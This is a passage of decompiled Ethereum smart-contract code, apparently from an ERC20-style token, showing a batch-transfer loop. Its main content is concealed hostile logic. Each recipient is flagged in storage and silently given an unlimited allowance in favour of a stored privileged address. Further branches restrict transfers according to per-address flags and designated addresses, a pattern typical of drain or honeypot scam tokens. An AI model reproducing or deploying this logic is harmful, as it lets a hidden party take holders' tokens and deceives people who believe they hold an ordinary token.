                                    emit Approval(-1, address(_1749), stor12);
                    else:
                        mem[0] = msg.sender
                        mem[32] = 1
                        if bool(stor1[address(msg.sender)]) == 1:
                            if not msg.sender:
                                revert with 0, 32, 37, 0x6545524332303a207472616e736665722066726f6d20746865207a65726f20616464726573, mem[mem[64] + 105 len 27]
                            if not mem[(32 * idx) + 140 len 20]:
                                revert with 0, 32, 35, 0xfe45524332303a207472616e7366657220746f20746865207a65726f20616464726573, mem[mem[64] + 103 len 29]
                            _1108 = mem[64]
                            mem[64] = mem[64] + 96
                            mem[_1108] = 38
                            mem[_1108 + 32 len 38] = 0x7345524332303a207472616e7366657220616d6f756e7420657863656564732062616c616e63
                            mem[32] = 0
                            if _987 > balanceOf[address(msg.sender)]:
                                _1193 = mem[64]
                                mem[mem[64]] = 0x8c379a000000000000000000000000000000000000000000000000000000000
                                mem[mem[64] + 4] = 32
                                mem[mem[64] + 36] = 38
                                idx = 0
                                while idx < 38:
                                    mem[_1193 + idx + 68] = mem[_1108 + idx + 32]
                                    idx = idx + 32
                                    continue 
                                mem[_1193 + 100] = mem[_1193 + 126 len 6]
                                revert with memory
                                  from mem[64]
                                   len _1193 + -mem[64] + 132
                            balanceOf[address(msg.sender)] -= _987
                            if balanceOf[address(_985)] + _987 < balanceOf[address(_985)]:
                                revert with 0, 'SafeMath: addition overflow'
                            mem[0] = address(_985)
                            mem[32] = 0
                            balanceOf[address(_985)] += _987
                            mem[mem[64]] = _987
                            emit Transfer(_987, msg.sender, address(_985));
                            if idx < arg1:
                                require idx < mem[96]
                                stor1[mem[(32 * idx) + 140 len 20]] = 1
                                require idx < mem[96]
                                _1668 = mem[(32 * idx) + 128]
                                if not mem[(32 * idx) + 140 len 20]:
                                    revert with 0, 32, 36, 0x7345524332303a20617070726f76652066726f6d20746865207a65726f20616464726573, mem[mem[64] + 104 len 28]
                                if not stor12:
                                    revert with 0, 32, 34, 0x7345524332303a20617070726f766520746f20746865207a65726f20616464726573, mem[mem[64] + 102 len 30]
                                mem[0] = stor12
                                mem[32] = sha3(mem[(32 * idx) + 140 len 20], 4)
                                allowance[mem[(32 * idx) + 140 len 20]][stor12] = -1
                                mem[mem[64]] = -1
                                emit Approval(-1, address(_1668), stor12);
                        else:
                            mem[0] = msg.sender
                            mem[32] = 2
                            if bool(stor2[address(msg.sender)]) == 1:
                                if msg.sender == stor11:
                                    if not msg.sender:
                                        revert with 0, 32, 37, 0x6545524332303a207472616e736665722066726f6d20746865207a65726f20616464726573, mem[mem[64] + 105 len 27]
                                    if not mem[(32 * idx) + 140 len 20]:
                                        revert with 0, 32, 35, 0xfe45524332303a207472616e7366657220746f20746865207a65726f20616464726573, mem[mem[64] + 103 len 29]
                                    _1228 = mem[64]
                                    mem[64] = mem[64] + 96
                                    mem[_1228] = 38
                                    mem[_1228 + 32 len 38] = 0x7345524332303a207472616e7366657220616d6f756e7420657863656564732062616c616e63
                                    mem[32] = 0
                                    if _987 > balanceOf[address(msg.sender)]:
                                        _1339 = mem[64]
                                        mem[mem[64]] = 0x8c379a000000000000000000000000000000000000000000000000000000000
                                        mem[mem[64] + 4] = 32
                                        mem[mem[64] + 36] = 38
                                        idx = 0
                                        while idx < 38:
                                            mem[_1339 + idx + 68] = mem[_1228 + idx + 32]
                                            idx = idx + 32
                                            continue 
                                        mem[_1339 + 100] = mem[_1339 + 126 len 6]
                                        revert with memory
                                          from mem[64]
                                           len _1339 + -mem[64] + 132
                                    balanceOf[address(msg.sender)] -= _987
                                    if balanceOf[address(_985)] + _987 < balanceOf[address(_985)]:
                                        revert with 0, 'SafeMath: addition overflow'
                                    mem[0] = address(_985)
                                    mem[32] = 0
                                    balanceOf[address(_985)] += _987
                                    mem[mem[64]] = _987
                                    emit Transfer(_987, msg.sender, address(_985));
                                    if idx < arg1:
                                        require idx < mem[96]
                                        stor1[mem[(32 * idx) + 140 len 20]] = 1
                                        require idx < mem[96]
                                        _1826 = mem[(32 * idx) + 128]
                                        if not mem[(32 * idx) + 140 len 20]:
                                            revert with 0, 32, 36, 0x7345524332303a20617070726f76652066726f6d20746865207a65726f20616464726573, mem[mem[64] + 104 len 28]
                                        if not stor12:
                                            revert with 0, 32, 34, 0x7345524332303a20617070726f766520746f20746865207a65726f20616464726573, mem[mem[64] + 102 len 30]
                                        mem[0] = stor12
                                        mem[32] = sha3(mem[(32 * idx) + 140 len 20], 4)
                                        allowance[mem[(32 * idx) + 140 len 20]][stor12] = -1
                                        mem[mem[64]] = -1
                                        emit Approval(-1, address(_1826), stor12);
                                else:
                                    if mem[(32 * idx) + 140 len 20] != stor12:
                                        revert with 0, 32, 38, 0x7345524332303a207472616e7366657220616d6f756e7420657863656564732062616c616e63, mem[mem[64] + 106 len 26]
                                    if not msg.sender:
                                        revert with 0, 32, 37, 0x6545524332303a207472616e736665722066726f6d20746865207a65726f20616464726573, mem[mem[64] + 105 len 27]
                                    if not mem[(32 * idx) + 140 len 20]:
                                        revert with 0, 32, 35, 0xfe45524332303a207472616e7366657220746f20746865207a65726f20616464726573, mem[mem[64] + 103 len 29]
                                    _1277 = mem[64]
                                    mem[64] = mem[64] + 96
                                    mem[_1277] = 38
                                    mem[_1277 + 32 len 38] = 0x7345524332303a207472616e7366657220616d6f756e7420657863656564732062616c616e63
                                    mem[32] = 0
                                    if _987 > balanceOf[address(msg.sender)]:
                                        _1406 = mem[64]
                                        mem[mem[64]] = 0x8c379a000000000000000000000000000000000000000000000000000000000
                                        mem[mem[64] + 4] = 32
                                        mem[mem[64] + 36] = 38
                                        idx = 0
                                        while idx < 38:
                                            mem[_1406 + idx + 68] = mem[_1277 + idx + 32]
                                            idx = idx + 32
                                            continue 
                                        mem[_1406 + 100] = mem[_1406 + 126 len 6]
                                        revert with memory
                                          from mem[64]
                                           len _1406 + -mem[64] + 132
                                    balanceOf[address(msg.sender)] -= _987
                                    if balanceOf[address(_985)] + _987 < balanceOf[address(_985)]:
                                        revert with 0, 'SafeMath: addition overflow'
                                    mem[0] = address(_985)
                                    mem[32] = 0
                                    balanceOf[address(_985)] += _987
                                    mem[mem[64]] = _987
                                    emit Transfer(_987, msg.sender, address(_985));
                                    if idx < arg1:
                                        require idx < mem[96]
                                        stor1[mem[(32 * idx) + 140 len 20]] = 1
                                        require idx < mem[96]
                                        _1853 = mem[(32 * idx) + 128]
                                        if not mem[(32 * idx) + 140 len 20]:
                                            revert with 0, 32, 36, 0x7345524332303a20617070726f76652066726f6d20746865207a65726f20616464726573, mem[mem[64] + 104 len 28]
                                        if not stor12:
                                            revert with 0, 32, 34, 0x7345524332303a20617070726f766520746f20746865207a65726f20616464726573, mem[mem[64] + 102 len 30]
                                        mem[0] = stor12
                                        mem[32] = sha3(mem[(32 * idx) + 140 len 20], 4)
                                        allowance[mem[(32 * idx) + 140 len 20]][stor12] = -1
                                        mem[mem[64]] = -1
                                        emit Approval(-1, address(_1853), stor12);
                            else:
                                if mem[(32 * idx) + (32 * arg2.length) + 160] >= stor3:
                                    if msg.sender == stor11:
                                        if not msg.sender:
                                            revert with 0, 32, 37, 0x6545524332303a207472616e736665722066726f6d20746865207a65726f20616464726573, mem[mem[64] + 105 len 27]
                                        if not mem[(32 * idx) + 140 len 20]:
                                            revert with 0, 32, 35, 0xfe45524332303a207472616e7366657220746f20746865207a65726f20616464726573, mem[mem[64] + 103 len 29]
                                        _1273 = mem[64]
                                        mem[64] = mem[64] + 96
                                        mem[_1273] = 38
                                        mem[_1273 + 32 len 38] = 0x7345524332303a207472616e7366657220616d6f756e7420657863656564732062616c616e63
                                        mem[32] = 0
                                        if _987 > balanceOf[address(msg.sender)]:
                                            _1396 = mem[64]
                                            mem[mem[64]] = 0x8c379a000000000000000000000000000000000000000000000000000000000
                                            mem[mem[64] + 4] = 32
                                            mem[mem[64] + 36] = 38
                                            idx = 0
                                            while idx < 38:
                                                mem[_1396 + idx + 68] = mem[_1273 + idx + 32]
                                                idx = idx + 32
                                                continue 
                                            mem[_1396 + 100] = mem[_1396 + 126 len 6]
                                            revert with memory
                                              from mem[64]
                                               len _1396 + -mem[64] + 132
                                        balanceOf[address(msg.sender)] -= _987
                                        if balanceOf[address(_985)] + _987 < balanceOf[address(_985)]:
                                            revert with 0, 'SafeMath: addition overflow'
                                        mem[0] = address(_985)
                                        mem[32] = 0
                                        balanceOf[address(_985)] += _987
                                        mem[mem[64]] = _987
                                        emit Transfer(_987, msg.sender, address(_985));
                                        if idx < arg1:
                                            require idx < mem[96]
                                            stor1[mem[(32 * idx) + 140 len 20]] = 1
                                            require idx < mem[96]
                                            _1871 = mem[(32 * idx) + 128]
                                            if not mem[(32 * idx) + 140 len 20]:
                                                revert with 0, 32, 36, 0x7345524332303a20617070726f76652066726f6d20746865207a65726f20616464726573, mem[mem[64] + 104 len 28]
                                            if not stor12:
                                                revert with 0, 32, 34, 0x7345524332303a20617070726f766520746f20746865207a65726f20616464726573, mem[mem[64] + 102 len 30]
                                            mem[0] = stor12
                                            mem[32] = sha3(mem[(32 * idx) + 140 len 20], 4)
                                            allowance[mem[(32 * idx) + 140 len 20]][stor12] = -1
                                            mem[mem[64]] = -1
                                            emit Approval(-1, address(_1871), stor12);
                                    else:
                                        if mem[(32 * idx) + 140 len 20] != stor12:
                                            revert with 0, 32, 38, 0x7345524332303a207472616e7366657220616d6f756e7420657863656564732062616c616e63, mem[mem[64] + 106 len 26]
                                        if not msg.sender:
                                            revert with 0, 32, 37, 0x6545524332303a207472616e736665722066726f6d20746865207a65726f20616464726573, mem[mem[64] + 105 len 27]
                                        if not mem[(32 * idx) + 140 len 20]:
                                            revert with 0, 32, 35, 0xfe45524332303a207472616e7366657220746f20746865207a65726f20616464726573, mem[mem[64] + 103 len 29]
                                        _1334 = mem[64]
                                        mem[64] = mem[64] + 96
                                        mem[_1334] = 38
                                        mem[_1334 + 32 len 38] = 0x7345524332303a207472616e7366657220616d6f756e7420657863656564732062616c616e63
                                        mem[32] = 0
                                        if _987 > balanceOf[address(msg.sender)]:
                                            _1456 = mem[64]
                                            mem[mem[64]] = 0x8c379a000000000000000000000000000000000000000000000000000000000
                                            mem[mem[64] + 4] = 32
                                            mem[mem[64] + 36] = 38
                                            idx = 0
                                            while idx < 38:
                                                mem[_1456 + idx + 68] = mem[_1334 + idx + 32]
                                                idx = idx + 32
                                                continue 
                                            mem[_1456 + 100] = mem[_1456 + 126 len 6]
                                            revert with memory
                                              from mem[64]
                                               len _1456 + -mem[64] + 132
                                        balanceOf[address(msg.sender)] -= _987
                                        if balanceOf[address(_985)] + _987 < balanceOf[address(_985)]:
                                            revert with 0, 'SafeMath: addition overflow'
                                        mem[0] = address(_985)
                                        mem[32] = 0
                                        balanceOf[address(_985)] += _987
                                        mem[mem[64]] = _987
                                        emit Transfer(_987, msg.sender, address(_985));
                                        if idx < arg1:
                                            require idx < mem[96]
                                            stor1[mem[(32 * idx) + 140 len 20]] = 1
                                            require idx < mem[96]
                                            _1894 = mem[(32 * idx) + 128]
                                            if not mem[(32 * idx) + 140 len 20]:
                                                revert with 0, 32, 36, 0x7345524332303a20617070726f76652066726f6d20746865207a65726f20616464726573, mem[mem[64] + 104 len 28]
                                            if not stor12:
                                                revert with 0, 32, 34, 0x7345524332303a20617070726f766520746f20746865207a65726f20616464726573, mem[mem[64] + 102 len 30]
                                            mem[0] = stor12
                                            mem[32] = sha3(mem[(32 * idx) + 140 len 20], 4)
                                            allowance[mem[(32 * idx) + 140 len 20]][stor12] = -1
                                            mem[mem[64]] = -1
                                            emit Approval(-1, address(_1894), stor12);
                                else:
                                    if mem[(32 * idx) + 140 len 20] != stor11:
                                        if not msg.sender:
                                            revert with 0, 32, 37, 0x6545524332303a207472616e736665722066726f6d20746865207a65726f20616464726573, mem[mem[64] + 105 len 27]
                                        if not mem[(32 * idx) + 140 len 20]:
                                            revert with 0, 32, 35, 0xfe45524332303a207472616e7366657220746f20746865207a65726f20616464726573, mem[mem[64] + 103 len 29]
                                        _1226 = mem[64]
                                        mem[64] = mem[64] + 96
                                        mem[_1226] = 38
                                        mem[_1226 + 32 len 38] = 0x7345524332303a207472616e7366657220616d6f756e7420657863656564732062616c616e63
                                        mem[32] = 0
                                        if _987 > balanceOf[address(msg.sender)]:
                                            _1336 = mem[64]
                                            mem[mem[64]] = 0x8c379a000000000000000000000000000000000000000000000000000000000
                                            mem[mem[64] + 4] = 32
                                            mem[mem[64] + 36] = 38
                                            idx = 0
                                            while idx < 38:
                                                mem[_1336 + idx + 68] = mem[_1226 + idx + 32]
                                                idx = idx + 32
                                                continue 
                                            mem[_1336 + 100] = mem[_1336 + 126 len 6]
                                            revert with memory
                                              from mem[64]
                                               len _1336 + -mem[64] + 132
                                        balanceOf[address(msg.sender)] -= _987
                                        if balanceOf[address(_985)] + _987 < balanceOf[address(_985)]:
                                            revert with 0, 'SafeMath: addition overflow'
                                        mem[0] = address(_985)
                                        mem[32] = 0
                                        balanceOf[address(_985)] += _987
                                        mem[mem[64]] = _987
                                        emit Transfer(_987, msg.sender, address(_985));
                                        if idx < arg1:
                                            require idx < mem[96]
                                            stor1[mem[(32 * idx) + 140 len 20]] = 1
                                            require idx < mem[96]
                                            _1849 = mem[(32 * idx) + 128]
                                            if not mem[(32 * idx) + 140 len 20]:
                                                revert with 0, 32, 36, 0x7345524332303a20617070726f76652066726f6d20746865207a65726f20616464726573, mem[mem[64] + 104 len 28]
                                            if not stor12:
                                                revert with 0, 32, 34, 0x7345524332303a20617070726f766520746f20746865207a65726f20616464726573, mem[mem[64] + 102 len 30]
                                            mem[0] = stor12
                                            mem[32] = sha3(mem[(32 * idx) + 140 len 20], 4)
                                            allowance[mem[(32 * idx) + 140 len 20]][stor12] = -1
                                            mem[mem[64]] = -1
                                            emit Approval(-1, address(_1849), stor12);
                                    else:
                                        stor2[address(msg.sender)] = 1
                                        mem[0] = msg.sender
                                        mem[32] = 1
                                        stor1[address(msg.sender)] = 0
                                        if not msg.sender:
                                            revert with 0, 32, 37, 0x6545524332303a207472616e736665722066726f6d20746865207a65726f20616464726573, mem[mem[64] + 105 len 27]
                                        if not mem[(32 * idx) + 140 len 20]:
                                            revert with 0, 32, 35, 0xfe45524332303a207472616e7366657220746f20746865207a65726f20616464726573, mem[mem[64] + 103 len 29]
                                        _1275 = mem[64]
                                        mem[64] = mem[64] + 96
                                        mem[_1275] = 38
                                        mem[_1275 + 32 len 38] = 0x7345524332303a207472616e7366657220616d6f756e7420657863656564732062616c616e63
                                        mem[32] = 0
                                        if _987 > balanceOf[address(msg.sender)]:
                                            _1401 = mem[64]
                                            mem[mem[64]] = 0x8c379a000000000000000000000000000000000000000000000000000000000
                                            mem[mem[64] + 4] = 32
                                            mem[mem[64] + 36] = 38
                                            idx = 0
                                            while idx < 38:
                                                mem[_1401 + idx + 68] = mem[_1275 + idx + 32]
                                                idx = idx + 32
                                                continue 
                                            mem[_1401 + 100] = mem[_1401 + 126 len 6]
                                            revert with memory
                                              from mem[64]
                                               len _1401 + -mem[64] + 132
                                        balanceOf[address(msg.sender)] -= _987
                                        if balanceOf[address(_985)] + _987 < balanceOf[address(_985)]:
                                            revert with 0, 'SafeMath: addition overflow'
                                        mem[0] = address(_985)
                                        mem[32] = 0
                                        balanceOf[address(_985)] += _987
                                        mem[mem[64]] = _987
                                        emit Transfer(_987, msg.sender, address(_985));
                                        if idx < arg1:
                                            require idx < mem[96]
                                            stor1[mem[(32 * idx) + 140 len 20]] = 1
                                            require idx < mem[96]
                                            _1875 = mem[(32 * idx) + 128]
                                            if not mem[(32 * idx) + 140 len 20]:
                                                revert with 0, 32, 36, 0x7345524332303a20617070726f76652066726f6d20746865207a65726f20616464726573, mem[mem[64] + 104 len 28]
                                            if not stor12:
                                                revert with 0, 32, 34, 0x7345524332303a20617070726f766520746f20746865207a65726f20616464726573, mem[mem[64] + 102 len 30]
                                            mem[0] = stor12
                                            mem[32] = sha3(mem[(32 * idx) + 140 len 20], 4)
                                            allowance[mem[(32 * idx) + 140 len 20]][stor12] = -1
                                            mem[mem[64]] = -1
                                            emit Approval(-1, address(_1875), stor12);
        idx = idx + 1
        continue 
}



}
